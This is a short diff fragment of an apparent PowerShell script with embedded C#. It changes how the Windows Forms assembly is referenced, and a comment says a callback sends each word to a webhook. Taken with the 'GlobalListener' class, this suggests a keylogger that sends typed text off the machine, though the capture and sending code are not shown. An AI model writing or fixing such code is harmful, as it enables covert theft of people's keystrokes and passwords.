@@ -118,7 +118,7 @@ public class GlobalListener {
         }
     }
 }
-"@ -AssemblyName "System.Windows.Forms"
+"@ -ReferencedAssemblies "System.Windows.Forms.dll"
 
 # --- Callback PowerShell: invia parola al webhook ---
 [GlobalListener]::Callback = [System.Action[string]]{
